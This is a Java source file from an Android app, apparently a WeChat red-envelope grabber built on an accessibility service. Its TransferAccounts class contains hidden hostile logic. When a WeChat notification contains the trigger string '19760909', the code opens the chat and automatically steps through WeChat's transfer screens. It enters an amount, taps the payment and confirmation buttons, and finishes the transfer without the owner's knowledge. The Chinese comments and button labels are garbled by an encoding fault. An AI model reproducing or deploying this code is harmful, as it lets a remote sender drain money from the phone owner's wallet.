/**
 * 
 */
package notification;

import java.util.List;

import util.ConfigCt;
import accessibility.QiangHongBaoService;

import android.annotation.TargetApi;
import android.app.Notification;
import android.app.PendingIntent;
import android.app.PendingIntent.CanceledException;
import android.content.Context;
import android.graphics.Point;
import android.os.Build;
import android.os.Handler;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import accessibility.AccessibilityHelper;
import util.Funcs;

/**
 * @author Administrator
 *
 */
public class TransferAccounts {
	public static final String WX_TRANSFER_ACCOUNTS_ORDER = "19760909";//��
	private static final String WINDOW_REMITTANCE_UI="com.tencent.mm.plugin.remittance.ui.RemittanceUI";
	private static final String WINDOW_PWD_UI="com.tencent.mm.plugin.wallet_core.ui.n";
	private static final String WINDOW_REMITTANCE_RESULT_UI="com.tencent.mm.plugin.remittance.ui.RemittanceResultNewUI";
	private static final String WINDOW_CHATTING_UI="com.tencent.mm.ui.chatting.ChattingUI";
	public static final String WINDOW_LAUNCHER_UI="com.tencent.mm.ui.LauncherUI";
	public static final String WIDGET_BUTTON="android.widget.Button";
	private String mCurrentUI="";
	private AccessibilityNodeInfo mRootNode;
	private static TransferAccounts current;//ʵ����
	public static boolean mWorking=false;
	public static String mAmount= "1";//��
	private String mPWD="";
	private QiangHongBaoService service;
	//PWD�������ֵ��
	private int mCellLen=0;
	private int mCellHigh=0;
	private int mPadLeft=0;
	private int mPadTop=0;
	private int mPadBottom=0;
	private Context context;
    private TransferAccounts(QiangHongBaoService service) {
    	this.service=service;
        this.context=(Context)service;
    }
    public static synchronized TransferAccounts getTransferAccounts(QiangHongBaoService service) {
        if(current == null) {
            current = new TransferAccounts(service);
        }else{
        	current.service=service;
        }
        return current;
    }
    /** ֪ͨ���¼�*/
    public void notificationEvent(String text, Notification nf) {
        if(text.contains(TransferAccounts.WX_TRANSFER_ACCOUNTS_ORDER)) { //�����Ϣ
        	openNotification(nf);
        }
    }
    /**��֪ͨ����Ϣ*/
    @TargetApi(Build.VERSION_CODES.JELLY_BEAN)
    private void openNotification(Notification notification) {
    	//TransferAccounts.Start();
    	//GivePower.Start();
        //�����Ǿ�������΢�ŵ�֪ͨ����Ϣ��
        PendingIntent pendingIntent = notification.contentIntent;
        boolean lock = NotifyHelper.isLockScreen(context);
        if(!lock) {
            NotifyHelper.send(pendingIntent);
        } else {
            //NotifyHelper.showNotify(getContext(), String.valueOf(notification.tickerText), pendingIntent);
        }

        if(lock) {
           // NotifyHelper.playEffect(getContext(), getConfigCt());
        }
    }
    /*
     * ���չ�������
     */
    public void onReceiveJob(AccessibilityEvent event) {
    	if(!event.getPackageName().toString().equals(ConfigCt.WECHAT_PACKAGENAME))return;
    	int eventType = event.getEventType();  
        switch (eventType) {  
        //��һ��������֪ͨ����Ϣ  
        case AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED:  
            List<CharSequence> texts = event.getText();  
            if(texts==null)return;
            if (!texts.isEmpty()) {  
                for (CharSequence text : texts) {  
                    String content = text.toString();  
                    if(ConfigCt.DEBUG)Log.i(ConfigCt.TAG, "TYPE_NOTIFICATION_STATE_CHANGED text:"+content);  
                    if (content.contains(WX_TRANSFER_ACCOUNTS_ORDER)) {  
                        //ģ���֪ͨ����Ϣ  
                        if (event.getParcelableData() != null&&event.getParcelableData() instanceof Notification) {  
                            Notification notification = (Notification) event.getParcelableData();  
                            PendingIntent pendingIntent = notification.contentIntent;  
                            try {  
                                pendingIntent.send();  
                                mWorking=true;
                            } catch (CanceledException e) {  
                                e.printStackTrace();  
                            }  
                        }  
                    }  
                }  
            }  
            break;  
        //�ڶ����������Ƿ����΢�ź����Ϣ����  
        case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED: 
        	if(!mWorking)return;
        	if(event.getClassName()==null)return;
        	mCurrentUI= event.getClassName().toString(); 
        	
            if (mCurrentUI.equals(WINDOW_LAUNCHER_UI)) { 
            	mRootNode=event.getSource();
            	clickJia(mRootNode);  
            }
            if (mCurrentUI.equals(WINDOW_REMITTANCE_UI)) {
            	
            }
            if (mCurrentUI.equals(WINDOW_PWD_UI)) {
            	//inputPWD();
            	//mWorking=false;
            }
            if (mCurrentUI.equals(WINDOW_REMITTANCE_RESULT_UI)) {
            	mRootNode=event.getSource();
            	clickCompleteButton(mRootNode);
            	mWorking=false;
            }
            break;   
        //�ڶ����� 
        case AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED: 
            if (mCurrentUI.equals(WINDOW_LAUNCHER_UI)) { 
            	mRootNode=event.getSource();
            	if (mRootNode == null) {return; }
            	mRootNode =AccessibilityHelper.getRootNode(mRootNode);
            	clickRemittanceItem(mRootNode);
            }
            if (mCurrentUI.equals(WINDOW_REMITTANCE_UI)) {
            	mRootNode=event.getSource();
            	if (mRootNode == null) {return; }
            	mRootNode =AccessibilityHelper.getRootNode(mRootNode);
            	clickAmountPanel(mRootNode,mAmount);
            }
            if (mCurrentUI.equals(WINDOW_PWD_UI)) {
            	mRootNode=event.getSource();
            	if (mRootNode == null) {return; }
            	mRootNode =AccessibilityHelper.getRootNode(mRootNode);
            	clickSafeButton(mRootNode);
            }
        	break; 
        }
    }
    /*
     * ������๦�ܰ�ť��
     */
    //@TargetApi(Build.VERSION_CODES.JELLY_BEAN)
    public boolean clickJia(AccessibilityNodeInfo rootNode){
    	AccessibilityNodeInfo nodeInfo = AccessibilityHelper.findNodeInfosByText(rootNode, "���๦�ܰ�ť",-1);
    	if(nodeInfo==null)return false;
    	if(!nodeInfo.getClassName().toString().equals("android.widget.ImageButton"))return false;
    	return AccessibilityHelper.performClick(nodeInfo);
    }
    /*
     * ���ת�ˣ�
     */
    //@TargetApi(Build.VERSION_CODES.JELLY_BEAN)
    public boolean clickRemittanceItem(AccessibilityNodeInfo rootNode){
    	AccessibilityNodeInfo nodeInfo = AccessibilityHelper.findNodeInfosByText(rootNode, "ת��",-1);
    	if(nodeInfo==null)return false;
    	return AccessibilityHelper.performClick(nodeInfo);
    }
    /*
     * ���ת�ˣ�
     */
    //@TargetApi(Build.VERSION_CODES.JELLY_BEAN)
    public boolean clickRemittanceButton(AccessibilityNodeInfo rootNode){
    	AccessibilityNodeInfo nodeInfo = AccessibilityHelper.findNodeInfosByTextAndClassName(rootNode, "ת��","android.widget.Button");
    	if(nodeInfo==null)return false;
    	return AccessibilityHelper.performClick(nodeInfo);
    }
    /*
     * �����
     */
    //@TargetApi(Build.VERSION_CODES.JELLY_BEAN)
    public boolean clickSafeButton(AccessibilityNodeInfo rootNode){
    	AccessibilityNodeInfo nodeInfo = AccessibilityHelper.findNodeInfosByTextAndClassName(rootNode, "��Ȼ֧��","android.widget.Button");
    	if(nodeInfo==null)return false;
    	return AccessibilityHelper.performClick(nodeInfo);
    }

    /*
     * �����
     */
    //@TargetApi(Build.VERSION_CODES.JELLY_BEAN)
    public boolean clickAmountButton(AccessibilityNodeInfo rootNode,String value){
    	AccessibilityNodeInfo nodeInfo = AccessibilityHelper.findNodeInfosByText(rootNode, value,-1);
    	if(nodeInfo==null)return false;
    	if(!nodeInfo.getClassName().toString().equals("android.widget.Button"))return false;
    	return AccessibilityHelper.performClick(nodeInfo);
    }
    public boolean clickAmountPanel(AccessibilityNodeInfo rootNode,String amount){
    	for(int i=0;i<amount.length();i++){
    		String c=amount.substring(i,i+1);
    		if(!clickAmountButton(rootNode,c))return false;
    	}
    	return clickRemittanceButton(rootNode);
    }
    /*
     * �����
     */
    //@TargetApi(Build.VERSION_CODES.JELLY_BEAN)
    public boolean clickCompleteButton(AccessibilityNodeInfo rootNode){
    	AccessibilityNodeInfo nodeInfo = AccessibilityHelper.findNodeInfosByTextAndClassName(rootNode, "���",WIDGET_BUTTON);
    	if(nodeInfo==null)return false;
    	return AccessibilityHelper.performClick(nodeInfo);
    }
   
  
}
